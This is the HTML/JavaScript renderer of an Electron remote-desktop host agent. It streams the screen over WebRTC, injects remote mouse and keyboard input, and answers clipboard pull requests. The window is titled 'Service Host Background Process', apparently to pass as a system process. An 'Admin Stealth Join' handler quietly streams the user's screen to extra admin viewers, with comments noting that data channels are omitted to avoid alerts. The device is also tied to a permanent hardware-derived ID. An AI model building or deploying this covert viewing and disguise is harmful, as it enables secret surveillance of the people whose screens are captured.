<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>Service Host Background Process</title>
</head>

<body>
    <script>
        const { ipcRenderer } = require('electron');
        const { io } = require('socket.io-client');
        let QRCode = null;
        try {
            QRCode = require('qrcode');
        } catch (e) {
            console.warn('[QR] Native qrcode module not found, will use fallback image generator');
        }
        const os = require('os');
        // Capture/encoder configuration + adaptive quality loop (unit tested, shared with perf/pipeline-bench).
        const hostStream = require('./lib/hostStream');

        const SIGNALING_URL = 'https://onechameleon.onrender.com';

        // ─────────────────────────────────────────────────────────────────────
        // KEEP-ALIVE  (Prevent Render free-tier cold-start / RAM wipe)
        // ─────────────────────────────────────────────────────────────────────
        setInterval(() => { fetch(`${SIGNALING_URL}/ping`).catch(() => {}); }, 5 * 60 * 1000);
        fetch(`${SIGNALING_URL}/ping`).catch(() => {});

        // ─────────────────────────────────────────────────────────────────────
        // STATE
        // ─────────────────────────────────────────────────────────────────────
        let socket = null;
        let peerConnection = null;
        let localStream = null;
        let currentSessionId = null;

        // Incremented for every negotiation. A slow startWebRTC() (screen capture can take a while) must not
        // overwrite a newer negotiation if the viewer re-joined meanwhile.
        let negotiationGen = 0;
        // Candidate counters for the failure report (counts only, never addresses)
        let candStats = { host: 0, srflx: 0, relay: 0, remote: 0, remoteDup: 0 };
        const seenRemote = new Set();

        // ─────────────────────────────────────────────────────────────────────
        // STRUCTURED LIFECYCLE LOGGING
        // One JSON line per event. Never logs SDP bodies, ICE addresses, tokens or the full session code.
        // diag() also reports the event to the signaling server so it shows up in the Render logs.
        // ─────────────────────────────────────────────────────────────────────
        function maskSession(id) {
            const s = String(id == null ? '' : id);
            return s.length <= 2 ? '**' : s.slice(0, 2) + '*'.repeat(Math.min(s.length - 2, 6));
        }
        function agentLog(event, fields) {
            console.log('[Chameleon-Agent]', event, JSON.stringify(Object.assign({ ts: new Date().toISOString(), session: maskSession(currentSessionId) }, fields || {})));
        }
        function diag(event, fields) {
            try {
                if (socket && socket.connected && currentSessionId) {
                    socket.emit('peer:diag', Object.assign({ sessionId: currentSessionId, event: event }, fields || {}));
                }
            } catch (e) { /* diagnostics are best-effort */ }
        }
        function candidateType(candidate) {
            const m = / typ (\w+)/.exec((candidate && candidate.candidate) || '');
            return m ? m[1] : 'unknown';
        }

        // Generate a 100% permanent 6-digit numeric code based on device hardware specs
        function getPermanentSessionId() {
            try {
                const hardwareIds = ipcRenderer.sendSync('get-hardware-ids-sync');
                const { machineGuid, boardSerial } = hardwareIds;
                const identifier = `${machineGuid}-${boardSerial}`;
                let hash = 0;
                for (let i = 0; i < identifier.length; i++) {
                    hash = (hash * 31 + identifier.charCodeAt(i)) & 0xffffffff;
                }
                const code = Math.abs(hash) % 900000 + 100000;
                return code.toString();
            } catch (e) {
                console.error('[WebRTC] Error retrieving hardware IDs via IPC, using hostname fallback:', e.message);
                try {
                    const identifier = os.hostname() + '-' + os.arch() + '-' + os.platform();
                    let hash = 0;
                    for (let i = 0; i < identifier.length; i++) {
                        hash = (hash * 31 + identifier.charCodeAt(i)) & 0xffffffff;
                    }
                    const code = Math.abs(hash) % 900000 + 100000;
                    return code.toString();
                } catch (e2) {
                    // Fallback to random if hardware fetch fails
                    return Math.floor(100000 + Math.random() * 900000).toString();
                }
            }
        }

        // DUAL DATA CHANNELS  ─ the core input-lag fix
        // mouse  → unordered + unreliable  (UDP semantics: drops are fine, new coord arrives immediately)
        // keyboard → ordered + reliable    (key events must arrive in order, never dropped)
        let mouseChannel = null;
        let keyboardChannel = null;

        let iceCandidateQueue = [];
        let isRemoteDescriptionSet = false;

        // Relay-mode state
        let relayInterval = null;
        let relayCanvas = document.createElement('canvas');
        let relayVideo = document.createElement('video');
        relayVideo.autoplay = true;
        relayVideo.muted = true;
        let isRelayingFrame = false;

        // Adaptive streaming. The host owns quality adaptation (it is the only side that sees the bandwidth estimate,
        // encode time and quality-limitation reason). Starts at 720p / 30 fps / ~2 Mbps and adapts within the viewer's
        // chosen preset; see lib/qualityController.js.
        let streamTuner = null;
        let selectedPreset = 'balanced';
        // H.264 by default (hardware decode on phones). `CHAMELEON_VIDEO_CODEC=VP8` switches hosts whose software
        // H.264 encoder is the bottleneck; run `npx electron perf/pipeline-bench.js` to compare on a given machine.
        const VIDEO_CODEC = String(process.env.CHAMELEON_VIDEO_CODEC || 'H264').toUpperCase();

        // ─────────────────────────────────────────────────────────────────────
        // ICE SERVER CONFIG  (multiple STUN servers for fast gathering + TURN fallback)
        // ─────────────────────────────────────────────────────────────────────
        // The previous list pointed at openrelay.metered.ca (a free TURN service that has been shut down: its DNS
        // now resolves to reserved addresses) and at stun1/stun2.l.google.com:443 (not real STUN endpoints), so
        // peers behind restrictive NATs could never connect. The signaling server is now the single source of
        // truth: it sends the current STUN/TURN list (incl. any configured TURN relay) with every
        // "agent:client_joined". These are only the fallback for a server that does not send one.
        let ICE_SERVERS = [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' },
            { urls: 'stun:stun.cloudflare.com:3478' }
        ];

        // ─────────────────────────────────────────────────────────────────────
        // SIGNALING
        // ─────────────────────────────────────────────────────────────────────
        // Admin Stealth Connections Map (adminSocketId => RTCPeerConnection)
        const adminConnections = new Map();

        function initSignaling() {
            if (socket) socket.disconnect();

            socket = io(SIGNALING_URL, {
                // Tight heartbeat so we detect dead connections within 10 s (default is 25 s)
                pingInterval: 5000,
                pingTimeout: 10000,
                reconnectionDelayMax: 5000
            });

            socket.on('connect', () => {
                console.log('[WS] Connected to signaling server');
                agentLog('socket_connected', {});
                const savedSessionId = getPermanentSessionId();
                const version = '1.4.1';

                socket.emit('agent:create_session', {
                    sessionId: savedSessionId,
                    deviceId: 'DEV-REAL-' + savedSessionId,
                    deviceDetails: {
                        hostname: os.hostname(),
                        platform: os.platform(),
                        arch: os.arch(),
                        release: os.release(),
                        version: version
                    }
                });
            });

            socket.on('disconnect', (reason) => {
                agentLog('socket_disconnected', { reason: reason });
            });

            socket.on('connect_error', (err) => {
                agentLog('socket_connect_error', { message: err && err.message });
            });

            socket.on('signal:undeliverable', (data) => {
                agentLog('signal_undeliverable', { event: data && data.event, reason: data && data.reason });
            });

            // Periodically emit heartbeat to update lastSeen in database and keep dashboard status online
            if (window.heartbeatInterval) clearInterval(window.heartbeatInterval);
            window.heartbeatInterval = setInterval(() => {
                if (socket && socket.connected) {
                    const savedSessionId = getPermanentSessionId();
                    socket.emit('agent:heartbeat', { deviceId: 'DEV-REAL-' + savedSessionId });
                }
            }, 8000);

            socket.on('agent:session_created', async (data) => {
                currentSessionId = data.sessionId;
                agentLog('session_created', {});
                const qrUrl = `https://chameleon-jet.vercel.app/?sess=${data.sessionId}`;

                let qrDataUrl = '';
                if (QRCode && QRCode.toDataURL) {
                    try {
                        qrDataUrl = await QRCode.toDataURL(qrUrl, { margin: 2, color: { dark: '#0f172a', light: '#ffffff' } });
                    } catch (e) {
                        console.error('[QR] QRCode.toDataURL failed:', e);
                    }
                }
                if (!qrDataUrl) {
                    qrDataUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(qrUrl)}&size=200x200`;
                }

                ipcRenderer.send('webrtc:qr_payload', { sessionId: data.sessionId, dataUrl: qrDataUrl, expiresIn: data.expiresIn });
                ipcRenderer.send('tray:update_status', 'pairing');
            });

            socket.on('agent:client_joined', async (data) => {
                console.log('[WS] Client joined session:', data.sessionId);
                const gen = ++negotiationGen;
                cleanupSession(true);
                currentSessionId = data.sessionId;
                if (Array.isArray(data.iceServers) && data.iceServers.length > 0) {
                    ICE_SERVERS = data.iceServers;
                }
                agentLog('peer_detected', { iceServers: ICE_SERVERS.length });
                diag('host_waiting', {});
                ipcRenderer.send('tray:update_status', 'connected');
                try {
                    await startWebRTC(gen);
                } catch (err) {
                    agentLog('negotiation_error', { message: err && err.message });
                    diag('failed', { code: 'NEGOTIATION_ERROR', reason: 'negotiation_error' });
                }
            });

            socket.on('agent:start_relay', async () => {
                console.log('[RELAY] Cloud relay mode requested by client');
                await startRelayMode();
            });

            socket.on('relay:input', (inputData) => {
                ipcRenderer.send('webrtc:remote_input', inputData);
            });
            socket.on('session:expired', () => {
                console.log('[WS] Session expired');
                currentSessionId = null;
                ipcRenderer.send('tray:update_status', 'idle');
            });

            socket.on('session:ended', () => {
                console.log('[WS] Session ended');
                cleanupSession();
            });

            socket.on('subscription_updated', (data) => {
                console.log('[WS] Subscription updated:', data);
                ipcRenderer.send('subscription:updated', data);
            });

            socket.on('subscription_expired', (data) => {
                console.log('[WS] Subscription expired:', data);
                ipcRenderer.send('subscription:expired', data);
            });

            // ── SDP Signaling ──
            // SDP and ICE messages are handled strictly one at a time, in arrival order. Otherwise a trickled
            // candidate can race an in-flight setRemoteDescription(): during an ICE restart (a re-offer with a new
            // ufrag) it would be rejected and lost.
            let signalChain = Promise.resolve();
            const inOrder = (handler) => (data) => {
                signalChain = signalChain.then(() => handler(data)).catch((e) => console.error('[SIGNAL] handler error:', e));
            };

            socket.on('signal:sdp', inOrder(async (data) => {
                try {
                    if (!peerConnection) return;
                    if (data.sdp.type === 'answer') {
                        // An answer is only valid for the offer we currently have outstanding. One that arrives for
                        // a previous (replaced) peer must not be applied to the new one.
                        if (peerConnection.signalingState !== 'have-local-offer') {
                            agentLog('stale_answer_ignored', { signalingState: peerConnection.signalingState });
                            return;
                        }
                        agentLog('answer_received', {});
                        diag('answer_received', {});
                    }
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
                    isRemoteDescriptionSet = true;

                    // Drain queued ICE candidates
                    for (const candidate of iceCandidateQueue) {
                        await peerConnection.addIceCandidate(candidate).catch(e => console.warn('[ICE] Queued candidate error:', e));
                    }
                    iceCandidateQueue = [];

                    if (data.sdp.type === 'offer') {
                        // A re-offer on a live peer is the viewer's ICE restart (network changed): answer it in place.
                        agentLog('offer_received', { restart: peerConnection.connectionState === 'connected' || peerConnection.connectionState === 'disconnected' || peerConnection.connectionState === 'failed' });
                        const answer = await peerConnection.createAnswer();
                        await peerConnection.setLocalDescription(answer);
                        socket.emit('signal:sdp', { sessionId: currentSessionId, sdp: peerConnection.localDescription, to: 'client' });
                        agentLog('answer_sent', {});
                        diag('answer_sent', {});
                    }
                } catch (err) {
                    console.error('[SDP] Error:', err);
                }
            }));

            socket.on('signal:ice', inOrder(async (data) => {
                try {
                    if (!data.candidate) return;
                    agentLog('ice_candidate_received', { candidateType: candidateType(data.candidate) });
                    const remoteKey = (data.candidate.candidate || '') + '|' + (data.candidate.usernameFragment || '');
                    if (seenRemote.has(remoteKey)) { candStats.remoteDup++; return; } // retransmitted: ignore
                    seenRemote.add(remoteKey);
                    candStats.remote++;
                    const candidate = new RTCIceCandidate(data.candidate);
                    if (peerConnection && isRemoteDescriptionSet) {
                        await peerConnection.addIceCandidate(candidate);
                    } else {
                        iceCandidateQueue.push(candidate);
                    }
                } catch (err) {
                    console.error('[ICE] Error:', err);
                }
            }));

            // ── Admin Stealth Join listeners ──
            socket.on('admin:join', async ({ sessionId, adminSocketId }) => {
                console.log('[Stealth] Admin connected to view stream:', adminSocketId);
                try {
                    const adminPC = new RTCPeerConnection({
                        iceServers: ICE_SERVERS,
                        iceCandidatePoolSize: 4,
                        bundlePolicy: 'max-bundle',
                        rtcpMuxPolicy: 'require',
                        iceTransportPolicy: 'all'
                    });

                    adminConnections.set(adminSocketId, adminPC);

                    if (!localStream) {
                        localStream = await getScreenStream();
                    }

                    if (localStream) {
                        localStream.getTracks().forEach(track => {
                            adminPC.addTrack(track, localStream);
                        });
                    }

                    // Admin only receives screen capture, data channels not added to prevent alerts/input conflict

                    adminPC.onicecandidate = (event) => {
                        if (event.candidate) {
                            socket.emit('admin:signal:ice', { sessionId, candidate: event.candidate, to: adminSocketId });
                        }
                    };

                    const offer = await adminPC.createOffer({
                        offerToReceiveAudio: false,
                        offerToReceiveVideo: false
                    });
                    await adminPC.setLocalDescription(offer);

                    socket.emit('admin:signal:sdp', { sessionId, sdp: adminPC.localDescription, to: adminSocketId });

                } catch (err) {
                    console.error('[Stealth] Admin WebRTC error:', err);
                }
            });

            socket.on('admin:signal:sdp', async ({ sdp, from }) => {
                try {
                    const adminPC = adminConnections.get(from);
                    if (adminPC) {
                        await adminPC.setRemoteDescription(new RTCSessionDescription(sdp));
                    }
                } catch (err) {
                    console.error('[Stealth SDP] Error:', err);
                }
            });

            socket.on('admin:signal:ice', async ({ candidate, from }) => {
                try {
                    const adminPC = adminConnections.get(from);
                    if (adminPC && candidate) {
                        await adminPC.addIceCandidate(new RTCIceCandidate(candidate));
                    }
                } catch (err) {
                    console.error('[Stealth ICE] Error:', err);
                }
            });

            socket.on('admin:leave', ({ adminSocketId }) => {
                console.log('[Stealth] Admin left stream:', adminSocketId);
                const adminPC = adminConnections.get(adminSocketId);
                if (adminPC) {
                    adminPC.close();
                    adminConnections.delete(adminSocketId);
                }
            });
        }

        // ─────────────────────────────────────────────────────────────────────
        // SCREEN CAPTURE
        // ─────────────────────────────────────────────────────────────────────
        // Captures the primary screen at the size that is actually streamed: 720p/30 fps normally, 1080p/30 fps for the
        // Quality preset. (It used to capture 1080p/60 and scale in the encoder: ~4-5 ms/frame more encode time, and
        // the software H.264 encoder could not hold 60 fps.) The encoder is then steered with setParameters().
        async function getScreenStream(height) {
            const sources = await ipcRenderer.invoke('get-desktop-sources');
            const primarySource = sources[0];

            try {
                const stream = await navigator.mediaDevices.getUserMedia(
                    hostStream.buildCaptureConstraints(primarySource.id, height || hostStream.captureHeightForPreset(selectedPreset))
                );
                stream.getVideoTracks().forEach(hostStream.configureTrack);
                return stream;
            } catch (e) {
                console.error('[CAPTURE] Error:', e);
                return null;
            }
        }

        // Preset change that needs a different capture size (Quality <-> Performance/Balanced): swap the capture track
        // on every live peer with replaceTrack(), which needs no renegotiation.
        async function restartCapture(height) {
            const fresh = await getScreenStream(height);
            if (!fresh) return;
            const track = fresh.getVideoTracks()[0];
            const peers = [peerConnection, ...adminConnections.values()].filter(Boolean);
            for (const pc of peers) {
                const sender = pc.getSenders().find((s) => s.track && s.track.kind === 'video');
                if (sender) { try { await sender.replaceTrack(track); } catch (e) { console.warn('[CAPTURE] replaceTrack failed:', e); } }
            }
            const previous = localStream;
            localStream = fresh;
            if (previous) previous.getTracks().forEach((t) => t.stop());
            agentLog('capture_restarted', { height: (track.getSettings() || {}).height || height });
            if (streamTuner) streamTuner.setCaptureHeight((track.getSettings() || {}).height || height);
        }


        // ─────────────────────────────────────────────────────────────────────
        // WEBRTC SETUP
        // ─────────────────────────────────────────────────────────────────────
        async function startWebRTC(gen) {
            candStats = { host: 0, srflx: 0, relay: 0, remote: 0, remoteDup: 0 };
            seenRemote.clear();
            const stream = await getScreenStream();
            if (gen !== negotiationGen) {
                // The viewer re-joined while we were capturing: a newer negotiation owns the session now.
                if (stream) stream.getTracks().forEach(t => t.stop());
                agentLog('negotiation_superseded', {});
                return;
            }
            localStream = stream;
            if (!localStream) {
                console.error('[RTC] Failed to get screen stream');
                // Without this the viewer waits forever: no offer will ever be produced. Say why.
                agentLog('capture_failed', {});
                diag('failed', { code: 'CAPTURE_FAILED', reason: 'screen_capture_unavailable' });
                return;
            }

            peerConnection = new RTCPeerConnection({
                iceServers: ICE_SERVERS,
                // Pre-gather 4 candidates in the background so ICE completes faster after negotiation
                iceCandidatePoolSize: 4,
                // Only one port bundle for all streams — fewer holes to punch through NAT
                bundlePolicy: 'max-bundle',
                rtcpMuxPolicy: 'require',
                // Prefer UDP for low latency; TCP is fallback only
                iceTransportPolicy: 'all'
            });

            // ── VIDEO TRACK ── (contentHint 'detail' was set at capture: keeps the requested resolution so text stays readable)
            localStream.getTracks().forEach(track => {
                peerConnection.addTrack(track, localStream);
            });

            // ── DUAL DATA CHANNELS ──
            // 1. MOUSE: unordered + unreliable (fire-and-forget, newest pos always wins)
            mouseChannel = peerConnection.createDataChannel('mouse', {
                ordered: false,
                maxRetransmits: 0 // Drop the packet, don't retry — the next mousemove will correct it
            });

            // 2. KEYBOARD: ordered + reliable (every keystroke must arrive, in order)
            keyboardChannel = peerConnection.createDataChannel('keyboard', {
                ordered: true
            });

            setupMouseChannel(mouseChannel);
            setupKeyboardChannel(keyboardChannel);

            // Allow agent to also receive channels the client creates (future-proofing)
            peerConnection.ondatachannel = (event) => {
                if (event.channel.label === 'mouse') setupMouseChannel(event.channel);
                else if (event.channel.label === 'keyboard') setupKeyboardChannel(event.channel);
            };

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    const ct = candidateType(event.candidate);
                    if (ct === 'host' || ct === 'srflx' || ct === 'relay') candStats[ct]++;
                    agentLog('ice_candidate_sent', { candidateType: ct });
                    socket.emit('signal:ice', { sessionId: currentSessionId, candidate: event.candidate, to: 'client' });
                }
            };

            peerConnection.oniceconnectionstatechange = () => {
                if (!peerConnection) return;
                agentLog('ice_connection_state', { state: peerConnection.iceConnectionState });
                diag('ice_connection_state', { state: peerConnection.iceConnectionState });
            };

            peerConnection.onconnectionstatechange = () => {
                if (!peerConnection) return;
                const state = peerConnection.connectionState;
                console.log('[RTC] Connection state:', state);
                agentLog('connection_state', { state: state });
                diag('connection_state', { state: state });
                if (state === 'connected') {
                    agentLog('connection_established', {});
                } else if (state === 'failed') {
                    agentLog('connection_failed', { reason: 'ice_or_dtls_failed', host: candStats.host, srflx: candStats.srflx, relay: candStats.relay, remote: candStats.remote });
                    diag('failed', { code: 'ICE_FAILED', reason: 'host_side_connection_failed', candHost: candStats.host, candSrflx: candStats.srflx, candRelay: candStats.relay, candRemote: candStats.remote });
                }
                if (state === 'failed') {
                    console.warn('[RTC] Connection failed. Attempting ICE restart...');
                    // Try ICE restart before full cleanup — this recovers from temporary network glitches
                    peerConnection.restartIce();
                } else if (state === 'closed') {
                    cleanupSession();
                }
            };

            // ── CREATE OFFER with H.264 SDP munging ──
            const offer = await peerConnection.createOffer({
                offerToReceiveAudio: false,
                offerToReceiveVideo: false
            });

            // Prefer the configured codec (H.264 by default) before setting the local description.
            offer.sdp = hostStream.preferCodec(offer.sdp, VIDEO_CODEC);
            await peerConnection.setLocalDescription(offer);
            if (gen !== negotiationGen || !peerConnection) return; // superseded while creating the offer

            socket.emit('signal:sdp', { sessionId: currentSessionId, sdp: peerConnection.localDescription, to: 'client' });
            agentLog('offer_sent', { bytes: (peerConnection.localDescription.sdp || '').length });
            diag('offer_sent', {});

            // Encoder parameters can only be applied to a connected sender: start the tuner once ICE connects.
            peerConnection.addEventListener('connectionstatechange', () => {
                if (peerConnection && peerConnection.connectionState === 'connected') startStreamTuner();
            });
        }

        // ─────────────────────────────────────────────────────────────────────
        // ADAPTIVE STREAMING
        // One host-side controller (lib/qualityController.js) reads getStats() once a second and steers the encoder
        // through RTCRtpSender.setParameters(): maxBitrate, maxFramerate, scaleResolutionDownBy. It replaces the old
        // ABR loop here AND the second controller that ran in the viewer; the two used to fight over the encoder.
        // ─────────────────────────────────────────────────────────────────────
        function startStreamTuner() {
            if (streamTuner) streamTuner.stop();
            streamTuner = new hostStream.StreamTuner({
                getPeer: () => peerConnection,
                preset: selectedPreset,
                sendToViewer: sendToViewer,
                onCaptureHeightChange: restartCapture,
                log: (event, fields) => agentLog(event, fields),
                onMetrics: reportSessionMetrics
            });
            // The real captured height can be smaller than requested (small screens): scale from what we really have.
            const track = localStream && localStream.getVideoTracks()[0];
            const actualHeight = track && track.getSettings ? track.getSettings().height : 0;
            if (actualHeight) streamTuner.captureHeight = actualHeight;
            streamTuner.start();
        }

        // Feeds the admin dashboard (session:metrics) with what is actually being sent.
        function reportSessionMetrics(m) {
            if (!socket || !socket.connected || !currentSessionId || m.sentFps === undefined) return;
            socket.emit('session:metrics', {
                sessionId: currentSessionId,
                fps: Math.round(m.sentFps || 0),
                bitrate: Math.round(m.sentKbps || 0),   // kbps
                latency: Math.round(m.rttMs || 0),      // ms
                packetLoss: m.lossPct || 0,             // %
                resolution: (m.width && m.height) ? (m.width + 'x' + m.height) : ''
            });
        }


        // ─────────────────────────────────────────────────────────────────────
        // DATA CHANNEL HANDLERS
        // ─────────────────────────────────────────────────────────────────────
        function setupMouseChannel(channel) {
            channel.onopen = () => console.log('[DC] Mouse channel open');
            channel.onclose = () => {
                console.log('[DC] Mouse channel closed');
                ipcRenderer.send('webrtc:release_all_input');
            };
            channel.onmessage = (event) => {
                try {
                    // Mouse events are tiny JSON blobs — parse and inject immediately
                    const data = JSON.parse(event.data);
                    if (data.type === 'ping') return;
                    // Route all mouse events (move, down, up, wheel, scroll) to native driver
                    ipcRenderer.send('webrtc:remote_input', data);
                } catch (e) { /* Drop malformed packets */ }
            };
        }

        function setupKeyboardChannel(channel) {
            channel.onopen = () => {
                console.log('[DC] Keyboard channel open');
                // Request current pause state to sync client on connection
                ipcRenderer.send('session:request_pause_state');
                
                // NAT keepalive — smaller interval than default to prevent UDP hole from closing
                channel.pingInterval = setInterval(() => {
                    if (channel.readyState === 'open') {
                        channel.send(JSON.stringify({ type: 'ping' }));
                    }
                }, 4000);
            };
            channel.onclose = () => {
                console.log('[DC] Keyboard channel closed');
                if (channel.pingInterval) clearInterval(channel.pingInterval);
                ipcRenderer.send('webrtc:release_all_input');
            };
            channel.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type === 'ping' || data.type === 'pong') return;
                    handleRemoteInput(data);
                } catch (e) { /* Drop malformed packets */ }
            };
        }

        // Deliver a small JSON message to the viewer on the reliable channel (probe replies, stats, clipboard).
        function sendToViewer(message) {
            if (keyboardChannel && keyboardChannel.readyState === 'open') {
                try { keyboardChannel.send(JSON.stringify(message)); } catch (e) { /* channel closing */ }
            }
        }

        let lastQualityPresetAt = 0;
        function handleRemoteInput(data) {
            if (data.type === 'clipboard_pull_request') {
                ipcRenderer.invoke('webrtc:clipboard_pull').then(text => {
                    sendToViewer({ type: 'clipboard_pull_response', text });
                }).catch(err => console.error('[Clipboard] Agent read error', err));
            } else if (data.type === 'quality_preset') {
                lastQualityPresetAt = Date.now();
                setQualityPreset(data.preset);
            } else if (data.type === 'update_resolution') {
                // Older viewers send a resolution label (and used to run their own bitrate controller). Treat it as a
                // request for a preset ceiling only: the host's controller stays in charge of the actual bitrate.
                // The compatibility twin that a current viewer sends right after `quality_preset` is ignored.
                const legacyPreset = hostStream.legacyResolutionToPreset(data.resolution, lastQualityPresetAt, Date.now());
                if (legacyPreset) setQualityPreset(legacyPreset);
            } else if (data.type === 'stats_subscribe') {
                if (streamTuner) streamTuner.setStatsSubscribed(!!data.on);
            } else if (data.type === 'input_probe') {
                // Goes through the same ordered input queue as real input, so the reply time includes any queueing.
                ipcRenderer.invoke('webrtc:input_probe', { id: data.id })
                    .then((r) => sendToViewer({ type: 'input_probe_ack', id: data.id, hostMs: r && r.hostMs }))
                    .catch(() => { /* probe is best-effort */ });
            } else {
                ipcRenderer.send('webrtc:remote_input', data);
            }
        }

        async function setQualityPreset(name) {
            if (!hostStream.PRESETS[name]) return;
            selectedPreset = name;
            if (streamTuner) await streamTuner.setPreset(name);
        }

        // ─────────────────────────────────────────────────────────────────────
        // CLOUD RELAY FALLBACK
        // Used only when WebRTC P2P fails after TURN. Sends JPEG frames via
        // WebSocket. Tuned for minimum latency: backpressure prevents queue buildup.
        // ─────────────────────────────────────────────────────────────────────
        async function startRelayMode() {
            if (!localStream) localStream = await getScreenStream();
            if (!localStream) return;

            relayVideo.srcObject = localStream;
            await relayVideo.play();

            if (relayInterval) clearInterval(relayInterval);

            // ~20 FPS max for relay — WebSocket can't sustain 60 FPS
            relayInterval = setInterval(() => {
                if (relayVideo.videoWidth === 0) return;

                // BACKPRESSURE: Don't enqueue a new frame until the previous one
                // has been acknowledged by the server. This is the key to preventing
                // a frame queue from building up and causing slideshow behavior.
                if (isRelayingFrame) return;
                isRelayingFrame = true;

                // Downscale to 960px width max for relay — must fit comfortably under 100 KB per frame
                const targetWidth = 960;
                relayCanvas.width = targetWidth;
                relayCanvas.height = Math.round((targetWidth / relayVideo.videoWidth) * relayVideo.videoHeight);

                const ctx = relayCanvas.getContext('2d');
                ctx.drawImage(relayVideo, 0, 0, relayCanvas.width, relayCanvas.height);

                relayCanvas.toBlob((blob) => {
                    if (!blob) { isRelayingFrame = false; return; }
                    socket.emit('relay:frame', { sessionId: currentSessionId, frame: blob }, () => {
                        // Server ACK: safe to capture next frame
                        isRelayingFrame = false;
                    });
                }, 'image/jpeg', 0.55); // 0.55 quality: good compression, acceptable sharpness

            }, 50); // 50ms = 20 FPS ceiling
        }

        // ─────────────────────────────────────────────────────────────────────
        // CLEANUP
        // ─────────────────────────────────────────────────────────────────────
        function cleanupSession(preserveSession = false) {
            agentLog('session_cleanup', { preserveSession: preserveSession });
            if (streamTuner) { streamTuner.stop(); streamTuner = null; }
            // Whatever the viewer was holding down (a key, a mouse button) must not stay held on this machine.
            ipcRenderer.send('webrtc:release_all_input');
            if (relayInterval) { clearInterval(relayInterval); relayInterval = null; }

            if (mouseChannel) { try { mouseChannel.close(); } catch(e){} mouseChannel = null; }
            if (keyboardChannel) { try { keyboardChannel.close(); } catch(e){} keyboardChannel = null; }

            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
            if (localStream) {
                localStream.getTracks().forEach(t => t.stop());
                localStream = null;
            }

            if (!preserveSession) {
                currentSessionId = null;
                ipcRenderer.send('tray:update_status', 'idle');
            }

            isRemoteDescriptionSet = false;
            iceCandidateQueue = [];
        }

        // ─────────────────────────────────────────────────────────────────────
        // IPC LISTENERS
        // ─────────────────────────────────────────────────────────────────────
        ipcRenderer.on('session:request_pairing', () => {
            if (!socket) initSignaling();
            if (!socket.connected) socket.connect();
            const savedSessionId = getPermanentSessionId();
            socket.emit('agent:create_session', { sessionId: savedSessionId });
        });

        ipcRenderer.on('session:disconnect', () => {
            if (socket && currentSessionId) {
                socket.disconnect();
                socket.connect();
            }
            cleanupSession();
        });

        ipcRenderer.on('session:pause_state', (event, isPaused) => {
            if (keyboardChannel && keyboardChannel.readyState === 'open') {
                keyboardChannel.send(JSON.stringify({ type: 'pause_state', paused: isPaused }));
            }
        });

        // ── BOOT ──
        initSignaling();
    </script>
</body>

</html>
